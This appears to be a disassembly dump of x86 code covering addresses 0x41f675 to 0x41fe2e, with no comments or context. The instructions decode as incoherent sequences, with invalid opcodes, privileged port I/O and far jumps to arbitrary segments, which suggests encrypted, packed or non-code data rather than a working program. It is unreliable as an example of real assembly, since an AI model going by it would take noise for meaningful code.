  41f675:	mov    ds:0xaf18e83f,al
  41f67a:	rcl    BYTE PTR [esi],cl
  41f67c:	mov    bh,0xab
  41f67e:	leave  
  41f67f:	sub    esp,edi
  41f681:	and    eax,0x51f8e9eb
  41f686:	aam    0x36
  41f688:	loopne 0x41f6cd
  41f68a:	xor    BYTE PTR [edx],0x5c
  41f68d:	jle    0x41f6dc
  41f68f:	mov    edi,0xe9437225
  41f694:	xchg   edi,eax
  41f695:	lea    esi,[ebp-0x40f3d8f4]
  41f69b:	(bad)  
  41f69c:	xchg   ebp,eax
  41f69d:	push   edx
  41f69e:	pop    ss
  41f69f:	mov    edx,0x41ac72f9
  41f6a4:	mov    ch,0xb3
  41f6a6:	test   eax,0x1c020169
  41f6ab:	inc    edi
  41f6ac:	call   0xfba9:0xd4d17e5e
  41f6b3:	xlat   BYTE PTR ds:[ebx]
  41f6b4:	push   eax
  41f6b5:	mov    bh,ch
  41f6b7:	call   0x94cff69f
  41f6bc:	retf   0xffec
  41f6bf:	xor    dl,0xba
  41f6c2:	dec    BYTE PTR [ebp+ebx*2-0x2a]
  41f6c6:	das    
  41f6c7:	mov    BYTE PTR [edi-0x13607f37],al
  41f6cd:	repz push esi
  41f6cf:	psllq  mm7,mm2
  41f6d2:	sub    eax,0x939499c1
  41f6d7:	jle    0x41f714
  41f6d9:	(bad)  
  41f6db:	mov    ecx,0x39761673
  41f6e0:	and    al,0xd1
  41f6e2:	retf   
  41f6e3:	push   ss
  41f6e4:	pop    ebp
  41f6e5:	xor    eax,0x86a63a00
  41f6ea:	test   eax,0xe3894d6
  41f6ef:	cld    
  41f6f0:	add    BYTE PTR [esi-0x73],dh
  41f6f3:	daa    
  41f6f4:	jns    0x41f6db
  41f6f6:	add    al,BYTE PTR [edx]
  41f6f8:	sub    dl,BYTE PTR [edi]
  41f6fa:	mov    cl,al
  41f6fc:	mov    al,ds:0x9b1b827d
  41f701:	and    eax,0xe3effcbf
  41f706:	hlt    
  41f707:	and    al,0xb4
  41f709:	jg     0x41f703
  41f70b:	push   esi
  41f70c:	(bad)  
  41f70d:	jecxz  0x41f73a
  41f70f:	cwde   
  41f710:	addr16 inc edi
  41f712:	cmp    BYTE PTR [ebx],dh
  41f714:	xchg   edx,eax
  41f715:	inc    ebp
  41f716:	mov    ebx,0x7724e457
  41f71b:	pop    esp
  41f71c:	in     al,0xe3
  41f71e:	bound  edi,QWORD PTR [edi+0x64]
  41f721:	pop    ds
  41f722:	cs in  eax,0x22
  41f725:	mov    esi,0x79fc2012
  41f72a:	fisttp DWORD PTR [ebx-0x2d]
  41f72d:	mov    ds:0x222ce334,al
  41f732:	jns    0x41f6fa
  41f734:	or     BYTE PTR [edi-0x2332226f],0xfd
  41f73b:	push   0x7c
  41f73d:	sbb    ecx,DWORD PTR [esi+0x404b78d1]
  41f743:	test   al,0xf
  41f745:	popa   
  41f746:	cdq    
  41f747:	inc    ebp
  41f748:	mov    ch,0x2c
  41f74a:	dec    esi
  41f74b:	les    eax,FWORD PTR [eax-0x58]
  41f74e:	xor    DWORD PTR [ebx+esi*8-0x61],edi
  41f752:	js     0x41f7ac
  41f754:	aad    0xd8
  41f756:	xor    ecx,DWORD PTR [edx-0x7e]
  41f759:	sahf   
  41f75a:	add    ch,BYTE PTR [eax+0x28b2451a]
  41f760:	mov    al,ds:0x652795e3
  41f765:	jo     0x41f71f
  41f767:	std    
  41f768:	jno    0x41f6eb
  41f76a:	and    eax,0x34ba8b9b
  41f76f:	adc    al,0x9d
  41f771:	or     ah,cl
  41f773:	cmp    DWORD PTR [esi+ebx*4-0x67],eax
  41f777:	mov    dl,ch
  41f779:	xchg   ebx,eax
  41f77a:	in     eax,dx
  41f77b:	mov    WORD PTR [esi],ss
  41f77d:	ja     0x41f7bf
  41f77f:	mov    ecx,0x8aac6647
  41f784:	stos   BYTE PTR es:[edi],al
  41f785:	pop    esi
  41f786:	mov    cl,0x96
  41f788:	jecxz  0x41f736
  41f78a:	into   
  41f78b:	fldcw  WORD PTR [edx]
  41f78d:	dec    DWORD PTR [esi]
  41f78f:	and    DWORD PTR [ebx+edi*8-0x48984a4b],eax
  41f796:	(bad)  
  41f797:	(bad)  
  41f798:	(bad)  [ebp-0x377185b5]
  41f79e:	dec    eax
  41f79f:	enter  0x96cd,0x98
  41f7a3:	xchg   esi,eax
  41f7a4:	and    ah,BYTE PTR [eax-0x2f]
  41f7a7:	push   edx
  41f7a8:	int    0x13
  41f7aa:	daa    
  41f7ab:	jecxz  0x41f820
  41f7ad:	aad    0x86
  41f7af:	dec    ebp
  41f7b0:	add    dl,bh
  41f7b2:	icebp  
  41f7b3:	fsub   DWORD PTR [eax+edx*8]
  41f7b6:	push   edx
  41f7b8:	push   ecx
  41f7b9:	arpl   WORD PTR [esp+edi*2-0xac8a4fd],ax
  41f7c0:	mov    ds:0x418a5397,al
  41f7c5:	push   ds
  41f7c6:	mov    esi,0xeab0e71f
  41f7cb:	sub    al,0x45
  41f7cd:	xchg   BYTE PTR [edi+ebp*2],ch
  41f7d0:	pop    esp
  41f7d1:	mov    ecx,0x459928af
  41f7d6:	call   0xcc46c4c7
  41f7db:	pop    eax
  41f7dc:	xchg   edi,ecx
  41f7de:	sub    eax,0x43e5b67d
  41f7e3:	sub    al,0x25
  41f7e5:	pop    edi
  41f7e6:	loop   0x41f7fa
  41f7e8:	xchg   edi,eax
  41f7e9:	daa    
  41f7ea:	addr16 sub cl,bl
  41f7ed:	iret   
  41f7ee:	aas    
  41f7ef:	imul   ebx,DWORD PTR ds:0xfc79e008,0x72d43a3f
  41f7f9:	pushf  
  41f7fa:	je     0x41f7af
  41f7fc:	aam    0xbd
  41f7fe:	mov    BYTE PTR [ecx-0x58],bl
  41f801:	loop   0x41f86a
  41f803:	xchg   ebp,eax
  41f804:	and    eax,0x716a3d3b
  41f809:	das    
  41f80a:	mov    dl,0x75
  41f80c:	jae    0x41f827
  41f80e:	lea    ebx,[eax+0x3eaf123d]
  41f814:	daa    
  41f815:	pop    ds
  41f816:	push   eax
  41f817:	adc    al,0x10
  41f819:	(bad)  
  41f81a:	in     al,dx
  41f81b:	cmp    eax,0x97735643
  41f820:	ins    BYTE PTR es:[edi],dx
  41f821:	adc    BYTE PTR [eax+ebx*2-0x2d],al
  41f825:	add    al,bh
  41f827:	rol    ebx,1
  41f829:	outs   dx,DWORD PTR ds:[esi]
  41f82a:	jg     0x41f81e
  41f82c:	les    esi,FWORD PTR [edi-0x712cd438]
  41f832:	test   BYTE PTR [edi-0x5b],ch
  41f835:	(bad)  
  41f836:	jmp    0xae10:0x1a8a2a63
  41f83d:	pop    esp
  41f83e:	int    0xcd
  41f840:	nop
  41f841:	pop    es
  41f842:	fwait
  41f843:	sub    eax,0xbf0a5e1e
  41f848:	in     eax,dx
  41f849:	pop    esp
  41f84a:	or     dl,ah
  41f84c:	test   DWORD PTR [esi-0x15aeb401],ebx
  41f852:	les    edx,FWORD PTR ds:0xca6439bb
  41f858:	std    
  41f859:	test   DWORD PTR [eax+0x5b],0xb26c6016
  41f860:	pop    edx
  41f861:	dec    edi
  41f862:	cmp    eax,0xe81d2868
  41f867:	sub    al,0xc4
  41f869:	rcr    ch,cl
  41f86b:	cmp    BYTE PTR [edi-0x70],dh
  41f86e:	push   ecx
  41f86f:	mov    edx,0x50b6d75a
  41f874:	rcr    ecx,0x9f
  41f877:	loopne 0x41f809
  41f879:	clc    
  41f87a:	outs   dx,DWORD PTR ds:[esi]
  41f87b:	icebp  
  41f87c:	add    esi,edi
  41f87e:	lea    ecx,ds:0xa0c264ee
  41f884:	xor    ecx,DWORD PTR [edi-0x74]
  41f887:	sahf   
  41f888:	fiadd  DWORD PTR [eax-0x20f4ca1d]
  41f88e:	push   ss
  41f88f:	mov    bl,0xd1
  41f891:	sbb    esi,DWORD PTR [eax-0x1d9302b3]
  41f897:	push   esp
  41f898:	fnstsw WORD PTR [eax]
  41f89a:	push   edx
  41f89b:	push   ebx
  41f89c:	ins    BYTE PTR es:[edi],dx
  41f89d:	mov    eax,0xe2a6b617
  41f8a2:	pop    ds
  41f8a3:	mov    ebx,0x2cd352ed
  41f8a8:	mov    cl,0xcf
  41f8aa:	pop    ecx
  41f8ab:	in     eax,0x7f
  41f8ad:	fstp   DWORD PTR [esi*1+0x3ab5b2c7]
  41f8b4:	inc    ecx
  41f8b5:	fdivr  DWORD PTR [esi+edx*1]
  41f8b8:	repz mov edx,0x50b19f7f
  41f8be:	lds    edx,FWORD PTR [esi+0x58217e97]
  41f8c4:	jle    0x41f8b9
  41f8c6:	or     BYTE PTR [ebx+0x32],bl
  41f8c9:	cwde   
  41f8ca:	xchg   edi,eax
  41f8cb:	cs mov edi,0x7a12deec
  41f8d1:	dec    edx
  41f8d2:	pop    ebp
  41f8d3:	xchg   edx,eax
  41f8d4:	pop    ss
  41f8d5:	cdq    
  41f8d6:	and    DWORD PTR cs:[edi+eiz*8-0x22],0xbaeb4906
  41f8df:	icebp  
  41f8e0:	inc    edi
  41f8e1:	xchg   edi,eax
  41f8e2:	mov    esp,0xd7ba5164
  41f8e7:	lds    edi,FWORD PTR [esp+edx*8+0x19]
  41f8eb:	inc    edi
  41f8ec:	pop    es
  41f8ed:	xor    BYTE PTR [edi-0x31],ah
  41f8f0:	xchg   esp,eax
  41f8f1:	pop    eax
  41f8f2:	jnp    0x41f8ed
  41f8f4:	mov    edi,0xfd782809
  41f8f9:	push   ebx
  41f8fa:	mov    ch,0x2c
  41f8fc:	mov    ecx,0xe87b097a
  41f901:	sbb    bl,dl
  41f903:	and    al,0x60
  41f905:	stc    
  41f906:	and    DWORD PTR [ecx],0xb972c550
  41f90c:	dec    DWORD PTR ss:[ecx-0x502e5b91]
  41f913:	and    al,BYTE PTR [edx-0x2a8c157c]
  41f919:	in     al,dx
  41f91a:	adc    edx,esi
  41f91c:	popa   
  41f91d:	jno    0x41f978
  41f91f:	hlt    
  41f920:	out    0xc3,eax
  41f922:	jbe    0x41f99e
  41f924:	(bad)  [eax+0x44f5a9c0]
  41f92a:	shr    DWORD PTR [ebp+0x2a],cl
  41f92d:	sub    dh,BYTE PTR [edx+eax*1+0x53]
  41f931:	and    BYTE PTR [ebp+0x22],cl
  41f934:	fs jb  0x41f99c
  41f937:	mov    dh,0xe
  41f939:	cmp    edx,edi
  41f93b:	xor    al,0x43
  41f93d:	and    esp,ebx
  41f93f:	int3   
  41f940:	xchg   ecx,eax
  41f941:	inc    ebx
  41f942:	jo     0x41f97b
  41f944:	mov    al,ds:0x68d702d0
  41f949:	xor    DWORD PTR [eax],esi
  41f94b:	jge    0x41f95f
  41f94d:	pop    edx
  41f94e:	adc    BYTE PTR [esi+0x5d986866],0x6a
  41f955:	fs fwait
  41f957:	imul   BYTE PTR [ebx+0x78]
  41f95a:	dec    ebx
  41f95b:	and    eax,0xb1a3611d
  41f960:	xchg   esp,eax
  41f961:	in     eax,0xb0
  41f963:	xchg   DWORD PTR [edi-0x4637124b],esp
  41f969:	cld    
  41f96a:	retf   0xf6ed
  41f96d:	or     ah,BYTE PTR [edi-0x20db43c2]
  41f973:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f974:	inc    ebp
  41f975:	jmp    0x2a099cf
  41f97a:	xor    ebp,DWORD PTR [eax+0x3b]
  41f97d:	push   0x96edfe36
  41f982:	lock dec ecx
  41f984:	cwde   
  41f985:	in     eax,dx
  41f986:	repnz and ecx,0xffffffef
  41f98a:	lds    ebx,FWORD PTR [ebp+0x1]
  41f98d:	adc    DWORD PTR [edi-0x3ff274c7],edx
  41f993:	and    bh,BYTE PTR [edi-0x79b2d6e7]
  41f999:	sbb    eax,0xdc5b500
  41f99e:	mov    ds:0x294249ab,eax
  41f9a3:	sbb    ch,0x72
  41f9a6:	adc    BYTE PTR [ebx+0x2],cl
  41f9a9:	sub    esp,esp
  41f9ab:	pushf  
  41f9ac:	sub    edi,DWORD PTR [eax]
  41f9ae:	inc    edi
  41f9af:	add    eax,0x7e723255
  41f9b4:	pop    eax
  41f9b5:	sbb    eax,0xf0855f24
  41f9ba:	lahf   
  41f9bb:	leave  
  41f9bc:	in     eax,dx
  41f9bd:	xor    BYTE PTR ds:[ebp+0x4faeca24],0xcd
  41f9c5:	xchg   edi,eax
  41f9c6:	out    0xcd,al
  41f9c8:	lods   al,BYTE PTR ds:[esi]
  41f9c9:	pop    eax
  41f9ca:	xchg   edx,eax
  41f9cb:	lea    ecx,[eax+0x3156ca0c]
  41f9d1:	fdiv   QWORD PTR [esi+0x56]
  41f9d4:	xchg   esp,eax
  41f9d5:	mov    DWORD PTR [edi],edx
  41f9d7:	in     al,dx
  41f9d8:	imul   eax,ebp,0x4653760a
  41f9de:	mov    al,0x11
  41f9e0:	out    dx,al
  41f9e1:	addr16 in al,dx
  41f9e3:	shl    DWORD PTR [ecx],0x31
  41f9e6:	ins    BYTE PTR es:[edi],dx
  41f9e7:	(bad)  
  41f9e8:	adc    DWORD PTR [esi+0x52],ebp
  41f9eb:	adc    ecx,DWORD PTR [eax]
  41f9ed:	lods   eax,DWORD PTR ds:[esi]
  41f9ee:	mov    ecx,0x8f550411
  41f9f3:	add    BYTE PTR [ebp+ebx*2+0x6],al
  41f9f7:	mov    esi,0xa3ea2b12
  41f9fc:	and    al,0x24
  41f9fe:	retf   
  41f9ff:	mov    al,ds:0xffa0d283
  41fa04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa05:	push   ecx
  41fa06:	repnz nop
  41fa08:	jo     0x41fa78
  41fa0a:	mov    eax,0xbbcc97c1
  41fa0f:	icebp  
  41fa10:	sub    eax,0xb2217fa9
  41fa15:	xchg   DWORD PTR [ecx-0x74],ebx
  41fa18:	sub    cl,BYTE PTR [ebx+0x2f]
  41fa1b:	cli    
  41fa1c:	icebp  
  41fa1d:	mov    ebp,0x9d31350a
  41fa22:	inc    esi
  41fa23:	xor    al,BYTE PTR [ebp-0x64]
  41fa26:	les    ebx,FWORD PTR ds:0x9434edba
  41fa2c:	dec    edx
  41fa2d:	and    eax,0x8c7dda65
  41fa32:	ror    DWORD PTR [edx+ebx*1-0x4d],cl
  41fa36:	loopne 0x41fa9d
  41fa38:	mov    ebx,0x9118cc2b
  41fa3d:	and    al,dl
  41fa3f:	int3   
  41fa40:	js     0x41fa79
  41fa42:	std    
  41fa43:	or     BYTE PTR [edi+0x5fcd649a],al
  41fa49:	xchg   DWORD PTR ds:0xa2e8e0a3,edi
  41fa4f:	fxch   st(1)
  41fa51:	data16 das 
  41fa53:	(bad)  
  41fa54:	pop    ss
  41fa55:	and    DWORD PTR [ebx-0x53b47f8c],eax
  41fa5b:	mov    edi,0x84a371ce
  41fa60:	mov    ch,0xfb
  41fa62:	xor    eax,0xb337e3da
  41fa67:	gs gs in eax,dx
  41fa6a:	jp     0x41fa93
  41fa6c:	loop   0x41fab0
  41fa6e:	in     eax,0xf6
  41fa70:	rcr    BYTE PTR [edx-0x3f00d8b5],0x1d
  41fa77:	ins    BYTE PTR es:[edi],dx
  41fa78:	fidiv  DWORD PTR [ebx-0x72]
  41fa7b:	push   ss
  41fa7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa7d:	and    al,0x85
  41fa7f:	ror    BYTE PTR [esi+0x5c7a1c17],1
  41fa85:	mov    ebp,0x1fb54aad
  41fa8a:	mov    esi,0x751c14c5
  41fa8f:	xchg   edx,eax
  41fa90:	mov    edi,ebp
  41fa92:	inc    edi
  41fa93:	mov    edx,es
  41fa95:	xor    DWORD PTR [ecx-0x2396ed76],edx
  41fa9b:	rol    BYTE PTR [esi-0x6f],cl
  41fa9e:	out    0x65,al
  41faa0:	je     0x41fa58
  41faa2:	jmp    0xef35:0xe137bbb0
  41faa9:	pop    edx
  41faaa:	loopne 0x41fac2
  41faac:	push   es
  41faad:	aad    0x2b
  41faaf:	add    edx,edx
  41fab1:	and    ah,dl
  41fab3:	add    eax,0xc11b00eb
  41fab8:	jmp    FWORD PTR [edi+eiz*2]
  41fabb:	out    0x85,al
  41fabd:	fiadd  DWORD PTR [ebp+0x62fa8109]
  41fac3:	leave  
  41fac4:	lds    ebx,FWORD PTR [edx]
  41fac6:	out    dx,eax
  41fac7:	iret   
  41fac8:	int3   
  41fac9:	push   esp
  41faca:	sub    dh,BYTE PTR [eax]
  41facc:	mov    DWORD PTR [esi],esp
  41face:	or     esp,DWORD PTR [esi-0x45a6d3e3]
  41fad4:	xchg   edi,eax
  41fad5:	cmc    
  41fad6:	pop    esi
  41fad7:	add    DWORD PTR [eax],edx
  41fad9:	push   ds
  41fada:	inc    esi
  41fadb:	arpl   bp,dx
  41fadd:	(bad)  
  41fade:	int    0x71
  41fae0:	cmc    
  41fae1:	add    edx,edx
  41fae3:	test   DWORD PTR [ebp+0x53f66f5a],edi
  41fae9:	(bad)  
  41faea:	es jge 0x41fa91
  41faed:	fs mov edi,fs
  41faf0:	in     eax,dx
  41faf1:	and    DWORD PTR [esi],edi
  41faf3:	or     DWORD PTR [esi],esp
  41faf5:	test   BYTE PTR [esi+0x325b3576],ch
  41fafb:	loopne 0x41fb27
  41fafd:	int    0x87
  41faff:	mov    ch,BYTE PTR [ebx+0x6487c05a]
  41fb05:	jnp    0x41faa1
  41fb07:	retf   0xb2f0
  41fb0a:	jle    0x41fb43
  41fb0c:	xor    dh,BYTE PTR [ecx-0x545da3af]
  41fb12:	scas   al,BYTE PTR es:[edi]
  41fb13:	xor    al,0x99
  41fb15:	loop   0x41fb69
  41fb17:	or     ah,dh
  41fb19:	ss repnz pop ss
  41fb1c:	std    
  41fb1d:	fadd   DWORD PTR [edi+0xd]
  41fb20:	push   edx
  41fb21:	or     dl,dl
  41fb23:	cmp    BYTE PTR [edi+eiz*4],dl
  41fb26:	fs dec eax
  41fb28:	jmp    0xf1a6:0x661cb120
  41fb2f:	dec    ebx
  41fb30:	sub    BYTE PTR [edx+0x6d87277d],cl
  41fb36:	fdiv   DWORD PTR [ebx+edx*8-0xb]
  41fb3a:	xchg   ecx,eax
  41fb3b:	out    0xe,al
  41fb3d:	lock push ebp
  41fb3f:	arpl   bx,si
  41fb41:	aaa    
  41fb42:	pop    ebx
  41fb43:	cmp    BYTE PTR [esi-0x3e],ch
  41fb46:	xor    DWORD PTR [ecx-0x2c],edi
  41fb49:	sti    
  41fb4a:	and    al,BYTE PTR [edx+0x69]
  41fb4d:	imul   ebp,DWORD PTR [eax+0x1b],0xffffffef
  41fb51:	(bad)  [esi]
  41fb53:	stc    
  41fb54:	ret    
  41fb55:	dec    ecx
  41fb56:	ins    DWORD PTR es:[edi],dx
  41fb57:	xor    al,0xb5
  41fb59:	fwait
  41fb5a:	pop    ecx
  41fb5b:	add    al,0xda
  41fb5d:	cld    
  41fb5e:	cmp    al,0x30
  41fb60:	js     0x41fb55
  41fb62:	or     eax,0x738d98e0
  41fb67:	or     DWORD PTR [edi-0x8],0x3d79b605
  41fb6e:	mov    cl,0xef
  41fb70:	aam    0xe9
  41fb72:	repnz aad 0x24
  41fb75:	rcr    BYTE PTR [edi+0x1a01a767],0x38
  41fb7c:	xchg   ebx,eax
  41fb7d:	test   eax,0xdde0eb45
  41fb82:	jae    0x41fb61
  41fb84:	aam    0x85
  41fb86:	jne    0x41fb20
  41fb88:	mov    ebp,0x1036a25d
  41fb8d:	push   ds
  41fb8e:	inc    ebp
  41fb8f:	or     al,dl
  41fb91:	sub    edi,DWORD PTR [eax+0x4d]
  41fb94:	outs   dx,BYTE PTR ds:[esi]
  41fb95:	ret    
  41fb96:	inc    eax
  41fb97:	dec    esi
  41fb98:	dec    ebp
  41fb99:	and    DWORD PTR [ebx-0x7b4b8253],eax
  41fb9f:	sub    ebp,edi
  41fba1:	pushf  
  41fba2:	inc    esp
  41fba3:	mov    bh,0xef
  41fba5:	lds    eax,FWORD PTR [esi+edx*2]
  41fba8:	sbb    DWORD PTR [edi+0x44c145c3],ebx
  41fbae:	fucom  st(4)
  41fbb0:	xchg   esp,eax
  41fbb1:	aam    0xfa
  41fbb3:	fdivr  st,st(1)
  41fbb5:	inc    esi
  41fbb6:	adc    ch,cl
  41fbb8:	fstp   DWORD PTR ds:0x5a81ae2f
  41fbbe:	pop    es
  41fbbf:	les    esi,FWORD PTR [edi]
  41fbc1:	fbstp  TBYTE PTR [edi+0x7b]
  41fbc4:	xchg   edx,eax
  41fbc5:	and    eax,0x1cf7db7b
  41fbca:	bound  edx,QWORD PTR [edx-0x63e6d915]
  41fbd0:	mov    esi,0x4b988d69
  41fbd5:	mov    WORD PTR [edx],es
  41fbd7:	retf   
  41fbd8:	outs   dx,DWORD PTR ds:[esi]
  41fbd9:	std    
  41fbda:	inc    esp
  41fbdb:	test   BYTE PTR [eax],ah
  41fbdd:	fist   DWORD PTR [edi+edi*2-0x5cf8e411]
  41fbe4:	sar    BYTE PTR [ecx+0xf2b11a2],cl
  41fbea:	mov    ah,0x32
  41fbec:	stc    
  41fbed:	jle    0x41fc15
  41fbef:	cmp    edi,eax
  41fbf1:	cli    
  41fbf2:	(bad)  
  41fbf3:	mov    ah,0x22
  41fbf5:	dec    esi
  41fbf6:	adc    al,0x26
  41fbf8:	lock ret 0xb383
  41fbfc:	mov    esi,0xe006c28
  41fc01:	out    0x4,al
  41fc03:	jmp    0xa63ba59b
  41fc08:	pushf  
  41fc09:	mov    cl,0x4f
  41fc0b:	xchg   ebp,eax
  41fc0c:	fs (bad) 
  41fc0e:	xchg   esi,eax
  41fc0f:	mov    BYTE PTR [ecx],cl
  41fc11:	cmp    eax,0x87d97520
  41fc16:	jnp    0x41fbdb
  41fc18:	cs pushf 
  41fc1a:	push   cs
  41fc1b:	loop   0x41fbfd
  41fc1d:	shr    BYTE PTR [ebp-0x6e],0x3e
  41fc21:	fimul  DWORD PTR [ecx+ebp*2-0x3e5989b5]
  41fc28:	mov    ecx,0x5e988ae2
  41fc2d:	mov    ch,0xef
  41fc2f:	sub    eax,0xb93ef138
  41fc34:	call   0x6fcd8dc5
  41fc39:	add    DWORD PTR [ebx+0x1],esp
  41fc3c:	sbb    DWORD PTR [eax+0x4b],ecx
  41fc3f:	not    DWORD PTR [esi+0x46]
  41fc42:	icebp  
  41fc43:	add    cl,BYTE PTR [edx+eax*4]
  41fc46:	repnz xor al,0x20
  41fc49:	daa    
  41fc4a:	pop    esi
  41fc4b:	ret    0x3ea6
  41fc4e:	and    edi,0x2d
  41fc51:	xor    DWORD PTR [ebp-0x54],esp
  41fc54:	test   DWORD PTR [edi-0x66f017e],0x5d3d9861
  41fc5e:	push   ss
  41fc5f:	add    eax,0x53049bd2
  41fc64:	cmova  edx,DWORD PTR ds:0x5d920bdd
  41fc6b:	test   BYTE PTR [ebp-0x218b060],bl
  41fc71:	out    dx,eax
  41fc72:	fdivr  QWORD PTR [eax-0x64]
  41fc75:	mov    ds:0x6d97dbdf,al
  41fc7a:	xchg   edi,eax
  41fc7b:	in     al,0xfc
  41fc7d:	push   0xffffffc6
  41fc7f:	(bad)  
  41fc80:	rol    BYTE PTR [edi+ecx*1+0x3c],cl
  41fc84:	dec    edx
  41fc85:	leave  
  41fc86:	mov    al,ds:0x4112c50d
  41fc8b:	xor    BYTE PTR [edx+0x57e36bf2],bh
  41fc91:	call   0xf479e78b
  41fc96:	in     al,0x3c
  41fc98:	jecxz  0x41fc24
  41fc9a:	jb     0x41fc31
  41fc9c:	pusha  
  41fc9d:	mov    ebp,0xf54b3ab4
  41fca2:	bound  ebp,QWORD PTR [esi+0x4df4573b]
  41fca8:	fiadd  DWORD PTR [ecx+0x3]
  41fcab:	jle    0x41fd16
  41fcad:	ficom  WORD PTR [ecx]
  41fcaf:	pop    edx
  41fcb0:	xchg   edi,eax
  41fcb1:	xor    DWORD PTR [edx],esp
  41fcb3:	dec    ebx
  41fcb4:	inc    esp
  41fcb5:	jge    0x41fc7d
  41fcb7:	cli    
  41fcb8:	or     al,0xc3
  41fcba:	lea    edx,[ecx]
  41fcbc:	add    eax,0xb3d7e46c
  41fcc1:	xchg   ebp,eax
  41fcc2:	gs fwait
  41fcc4:	shr    BYTE PTR [esi],1
  41fcc6:	scas   eax,DWORD PTR es:[edi]
  41fcc7:	mov    eax,0xf70007d9
  41fccc:	or     BYTE PTR [edx],dh
  41fcce:	mov    al,ds:0xc824b234
  41fcd3:	or     ebx,DWORD PTR [edi-0xc9248cc]
  41fcd9:	je     0x41fcf9
  41fcdb:	xchg   ebp,eax
  41fcdc:	or     eax,0xff280185
  41fce1:	ret    0x6831
  41fce4:	pop    es
  41fce5:	lea    esi,[esp+esi*8-0x32]
  41fce9:	sub    dl,cl
  41fceb:	xor    edi,esp
  41fced:	xor    ebx,DWORD PTR [eax+0x4e194baf]
  41fcf3:	dec    ebx
  41fcf4:	mov    bl,0x53
  41fcf6:	sbb    ebp,DWORD PTR [ebx+0x3d]
  41fcf9:	test   al,0x38
  41fcfb:	xchg   ecx,eax
  41fcfc:	mov    ah,0x8a
  41fcfe:	fs in  al,dx
  41fd00:	xchg   edi,eax
  41fd01:	daa    
  41fd02:	repz sbb al,0x51
  41fd05:	cmp    al,0x69
  41fd07:	jno    0x41fc8c
  41fd09:	mov    bl,0x8e
  41fd0b:	fs hlt 
  41fd0d:	daa    
  41fd0e:	add    BYTE PTR [eax+eax*8-0x61],cl
  41fd12:	lods   al,BYTE PTR ds:[esi]
  41fd13:	cwde   
  41fd14:	xor    BYTE PTR ds:0xdd123b81,bh
  41fd1a:	outs   dx,BYTE PTR ds:[esi]
  41fd1b:	pop    esi
  41fd1c:	enter  0xd213,0x4b
  41fd20:	jbe    0x41fd8a
  41fd22:	add    BYTE PTR [edi],0xb0
  41fd25:	sub    BYTE PTR es:[eax-0x4e],dh
  41fd29:	cli    
  41fd2a:	push   ss
  41fd2b:	and    BYTE PTR [ecx+ebx*4-0x2f6c3f4b],bh
  41fd32:	jmp    0x6336:0x76b65c15
  41fd39:	sbb    al,0xad
  41fd3b:	xchg   ebp,eax
  41fd3c:	test   DWORD PTR [edx+0x366a3022],0xb50e93d1
  41fd46:	mov    dl,0x11
  41fd48:	out    0x4a,eax
  41fd4a:	inc    esp
  41fd4b:	fwait
  41fd4c:	xchg   ecx,eax
  41fd4d:	or     esi,DWORD PTR [ebx]
  41fd4f:	test   al,0x19
  41fd51:	test   al,0x60
  41fd53:	fisub  WORD PTR [esi-0x1727d583]
  41fd59:	popf   
  41fd5a:	ss sbb al,0x30
  41fd5d:	or     DWORD PTR ds:0x53a3eafe,esi
  41fd63:	test   eax,0xdd5e01cb
  41fd68:	dec    esp
  41fd69:	fld    TBYTE PTR [ecx-0x22268ffa]
  41fd6f:	test   BYTE PTR [edx],bh
  41fd71:	xchg   ebp,eax
  41fd72:	cli    
  41fd73:	mov    WORD PTR [edi],cs
  41fd75:	jmp    0xd446:0x1cf0d8e5
  41fd7c:	shr    DWORD PTR [ecx],cl
  41fd7e:	ja     0x41fd4d
  41fd80:	mov    ah,0x80
  41fd82:	xor    al,0xca
  41fd84:	sbb    dh,dh
  41fd86:	jmp    0x41fd75
  41fd88:	mov    WORD PTR [edi+0x3ee95e82],?
  41fd8e:	sub    cl,al
  41fd90:	out    0x16,al
  41fd92:	pushf  
  41fd93:	xchg   BYTE PTR [ebp-0x61a7cb5b],dh
  41fd99:	call   0xf4bd:0xb9a6e3c4
  41fda0:	and    BYTE PTR [esi+0x4],bl
  41fda3:	in     eax,0xc5
  41fda5:	mov    ch,0x9e
  41fda7:	(bad)  
  41fda8:	call   0xcbee:0x11dd655d
  41fdaf:	adc    eax,0x4ccbe365
  41fdb4:	sub    al,0x7
  41fdb6:	xchg   ebx,eax
  41fdb7:	popf   
  41fdb8:	out    0xb8,al
  41fdba:	dec    ecx
  41fdbb:	cmp    al,0xd1
  41fdbd:	xchg   esp,eax
  41fdbe:	pop    esp
  41fdbf:	dec    esp
  41fdc0:	pop    edx
  41fdc1:	jb     0x41fd9a
  41fdc3:	xchg   ebx,eax
  41fdc4:	xor    eax,0xf3181330
  41fdc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fdca:	fcom   QWORD PTR [esi+eiz*2]
  41fdcd:	cmp    ebp,DWORD PTR [esi]
  41fdcf:	ja     0x41fdfb
  41fdd1:	sti    
  41fdd2:	shl    dl,0x8d
  41fdd5:	shl    DWORD PTR [eax+0x17f34092],0x37
  41fddc:	pop    es
  41fddd:	jle    0x41fd6f
  41fddf:	push   ecx
  41fde0:	pop    ebx
  41fde1:	cwde   
  41fde2:	les    ebp,FWORD PTR [ecx]
  41fde4:	mov    bl,ah
  41fde6:	and    cl,ch
  41fde8:	jns    0x41fd8e
  41fdea:	xor    dl,dh
  41fdec:	adc    DWORD PTR [eax-0x2f58b329],ebp
  41fdf2:	test   BYTE PTR [ebx+0x403f14fa],bl
  41fdf8:	aas    
  41fdf9:	int    0x16
  41fdfb:	aas    
  41fdfc:	inc    edx
  41fdfd:	dec    ecx
  41fdfe:	jg     0x41fe50
  41fe00:	sub    eax,0xad7b0072
  41fe05:	sub    al,0x25
  41fe07:	test   BYTE PTR [ecx+0x51],dl
  41fe0a:	nop
  41fe0b:	sbb    BYTE PTR [ecx],dl
  41fe0d:	add    eax,DWORD PTR [eax+0x414f5556]
  41fe13:	cmc    
  41fe14:	inc    ebx
  41fe15:	lods   al,BYTE PTR ds:[esi]
  41fe16:	sar    dh,0x14
  41fe19:	pop    esi
  41fe1a:	loope  0x41fdb9
  41fe1c:	add    eax,0xf8044cb0
  41fe21:	jmp    0x3885:0xfb02231b
  41fe28:	pop    esi
  41fe29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe2a:	pop    esi
  41fe2b:	xchg   ecx,eax
  41fe2c:	jnp    0x41fdcf
  41fe2e:	pop    esp
